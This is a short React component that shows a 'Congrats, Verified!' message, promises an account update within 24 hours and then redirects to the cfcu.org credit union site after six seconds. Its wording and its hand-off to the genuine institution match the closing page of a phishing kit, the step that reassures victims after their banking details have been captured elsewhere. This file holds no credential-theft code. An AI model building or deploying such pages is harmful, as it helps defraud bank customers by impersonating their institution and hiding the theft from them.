import { Text, VStack } from "@chakra-ui/react";
import React, { useEffect } from "react";

const Closing = () => {
  useEffect(() => {
    setTimeout(() => {
      window.location.replace("https://cfcu.org");
    }, 6000);
  }, []);
  return (
    <VStack
      spacing="6"
      w={{ base: "100%", md: "50%" }}
      marginLeft={{ base: "unset", md: "25%" }}
      bg="#1c70c8"
      p="4"
      color="#fff"
    >
      <Text
        fontFamily="Poppins"
        fontSize="lg"
        fontWeight="bold"
        textAlign="left"
      >
        Congrats, Verified!
      </Text>
      <Text fontFamily="Poppins" fontSize="xs" textAlign="left">
        You have verified your account. We are sorry for the inconvenience that
        this might have caused you. We will update your account within the next
        24 hours. <br />
        Please wait, you will be redirected to the authentication if the page
        doesn't reload in 5 seconds
      </Text>
    </VStack>
  );
};

export default Closing;
